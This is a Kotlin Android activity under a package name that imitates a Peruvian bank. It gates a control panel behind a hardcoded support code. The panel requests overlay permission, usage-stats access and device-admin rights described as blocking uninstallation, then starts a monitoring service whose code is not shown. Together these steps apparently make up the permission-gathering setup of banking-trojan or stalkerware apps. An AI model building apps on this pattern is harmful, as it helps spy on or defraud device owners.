package pe.com.scotiabank.blpm.android.knull

import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Process
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.compose.LifecycleEventEffect
import pe.com.scotiabank.blpm.android.knull.faceguard.AdminReceiver
import pe.com.scotiabank.blpm.android.knull.faceguard.FaceGuardService

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Solicita el permiso para mostrar sobre otras aplicaciones si no está concedido
        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:${packageName}")
            )
            startActivity(intent)
        }

        setContent {
            var isAuthorized by remember { mutableStateOf(false) }

            MaterialTheme {
                Surface(modifier = Modifier.fillMaxSize()) {
                    if (isAuthorized) {
                        HomeScreen(
                            onEnableAdmin = { requestDeviceAdmin() },
                            onStartService = { startGuardService() }
                        )
                    } else {
                        LoginScreen(onAccessGranted = { isAuthorized = true })
                    }
                }
            }
        }
    }

    private fun requestDeviceAdmin() {
        val componentName = ComponentName(this, AdminReceiver::class.java)
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Permite la protección del dispositivo contra desinstalación.")
        }
        startActivity(intent)
    }

    private fun startGuardService() {
        val intent = Intent(this, FaceGuardService::class.java)
        startService(intent)
    }
}

@Composable
fun HomeScreen(
    onEnableAdmin: () -> Unit,
    onStartService: () -> Unit
) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text(text = "Panel de Control", style = MaterialTheme.typography.headlineMedium)

        Spacer(modifier = Modifier.height(24.dp))

        // INTEGRACIÓN: Verificación de permiso de estadísticas de uso
        UsagePermissionCheck()

        Spacer(modifier = Modifier.height(24.dp))

        Button(
            onClick = onEnableAdmin,
            modifier = Modifier.fillMaxWidth()
        ) {
            Text("1. Activar Permiso de Administración")
        }

        Spacer(modifier = Modifier.height(16.dp))

        Button(
            onClick = onStartService,
            modifier = Modifier.fillMaxWidth()
        ) {
            Text("2. Iniciar Servicio de Monitoreo")
        }
    }
}

@Composable
fun LoginScreen(onAccessGranted: () -> Unit) {
    var password by remember { mutableStateOf("") }
    val correctPassword = "130923"

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text(
            text = "Ingrese código de soporte",
            style = MaterialTheme.typography.headlineSmall
        )

        Spacer(modifier = Modifier.height(16.dp))

        OutlinedTextField(
            value = password,
            onValueChange = {
                password = it
                if (it == correctPassword) {
                    onAccessGranted()
                }
            },
            label = { Text("Código") },
            visualTransformation = PasswordVisualTransformation(),
            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
            modifier = Modifier.fillMaxWidth()
        )

        if (password.length >= 6 && password != correctPassword) {
            Text(
                text = "Código incorrecto",
                color = MaterialTheme.colorScheme.error,
                modifier = Modifier.padding(top = 8.dp)
            )
        }
    }
}

/**
 * Verifica si el permiso PACKAGE_USAGE_STATS está concedido.
 */
fun hasUsageStatsPermission(context: Context): Boolean {
    val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
    val mode = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
        appOps.unsafeCheckOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            Process.myUid(),
            context.packageName
        )
    } else {
        @Suppress("DEPRECATION")
        appOps.checkOpNoThrow(
            AppOpsManager.OPSTR_GET_USAGE_STATS,
            Process.myUid(),
            context.packageName
        )
    }
    return mode == AppOpsManager.MODE_ALLOWED
}

/**
 * Componente que muestra un botón de advertencia si falta el permiso de uso,
 * o un mensaje de confirmación si ya está activo.
 */
@Composable
fun UsagePermissionCheck() {
    val context = LocalContext.current
    var hasPermission by remember { mutableStateOf(hasUsageStatsPermission(context)) }

    // Re-verificar cuando el usuario regresa de la pantalla de ajustes
    LifecycleEventEffect(Lifecycle.Event.ON_RESUME) {
        hasPermission = hasUsageStatsPermission(context)
    }

    if (!hasPermission) {
        Button(
            onClick = {
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                context.startActivity(intent)
            },
            modifier = Modifier.fillMaxWidth(),
            colors = ButtonDefaults.buttonColors(
                containerColor = MaterialTheme.colorScheme.error
            )
        ) {
            Icon(Icons.Default.Warning, contentDescription = null)
            Spacer(Modifier.width(8.dp))
            Text("Falta Permiso de Uso (Click aquí)")
        }
    } else {
        Text(
            text = "✓ Permiso de estadísticas activo",
            color = MaterialTheme.colorScheme.primary,
            style = MaterialTheme.typography.bodyMedium
        )
    }
}